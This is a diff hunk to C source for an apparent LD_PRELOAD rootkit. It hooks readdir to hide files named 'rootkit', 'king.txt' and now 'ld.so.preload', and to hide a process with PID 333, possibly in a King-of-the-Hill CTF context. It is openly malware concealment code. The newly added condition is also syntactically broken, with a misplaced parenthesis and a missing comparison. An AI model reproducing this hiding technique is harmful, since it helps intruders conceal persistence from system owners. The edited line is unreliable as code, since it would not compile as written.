@@ -17,8 +17,8 @@ struct dirent *readdir(DIR *dirp) {
 
     struct dirent *entry;
     while ((entry = orig_readdir(dirp)) != NULL) {
-        // Hide files/directories containing "rootkit" or "king.txt"
-        if (strstr(entry->d_name, "rootkit") == NULL && strstr(entry->d_name, "king.txt") == NULL) {
+        // Hide files/directories containing "rootkit" or "king.txt" or "ld.so.preload"
+        if (strstr(entry->d_name, "rootkit") == NULL && strstr(entry->d_name, "king.txt" && strstr(entry->d_name, "ld.so.preload") == NULL) {
             // Hide process with a specific PID (e.g., 333)
             if (strcmp(entry->d_name, "333") == 0) {
                 continue;
